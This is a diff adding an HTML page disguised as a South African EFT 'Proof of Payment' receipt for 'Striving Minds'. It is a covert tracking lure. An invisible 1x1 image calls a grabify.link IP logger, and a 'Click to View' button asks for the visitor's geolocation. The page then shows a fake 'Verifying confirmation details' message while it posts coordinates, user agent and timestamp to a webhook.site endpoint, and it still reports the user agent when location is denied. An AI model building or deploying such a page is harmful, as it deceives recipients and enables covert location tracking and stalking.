@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Proof of Payment – Striving Minds</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 60px;
+      background-color: #f9f9f9;
+    }
+    .container {
+      background-color: white;
+      display: inline-block;
+      padding: 30px 50px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #222;
+      margin-bottom: 30px;
+    }
+    p {
+      font-size: 16px;
+      margin: 8px 0;
+    }
+    button {
+      margin-top: 25px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #1976d2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #output {
+      margin-top: 20px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Proof of Payment – Striving Minds</h1>
+    <p><strong>Transaction Ref:</strong> SM45729</p>
+    <p><strong>Amount Paid:</strong> R17,500.00</p>
+    <p><strong>Payment Date:</strong> 13/05/2025, 13:48</p>
+    <p><strong>Processed via:</strong> EFT Online Banking</p>
+    <button onclick="getLocation()">Click to View</button>
+    <p id="output"></p>
+  </div>
+
+  <img src="https://grabify.link/K2HTRA" width="1" height="1" style="display:none;">
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, silentFail, {timeout: 5000});
+      } else {
+        logNoLocation("Geolocation not supported");
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      document.getElementById("output").innerText = "Verifying confirmation details...";
+
+      const payload = {
+        timestamp: new Date().toISOString(),
+        latitude: lat,
+        longitude: lon,
+        userAgent: navigator.userAgent,
+        status: "GPS allowed"
+      };
+
+      fetch("https://webhook.site/f89aa1bf-0206-4286-9394-8c806d89a8bb", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    function silentFail(error) {
+      document.getElementById("output").innerText = "Verifying confirmation details...";
+
+      logNoLocation("Location access denied or failed");
+    }
+
+    function logNoLocation(reason) {
+      const payload = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        status: reason
+      };
+
+      fetch("https://webhook.site/f89aa1bf-0206-4286-9394-8c806d89a8bb", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    }
+  </script>
+</body>
+</html>
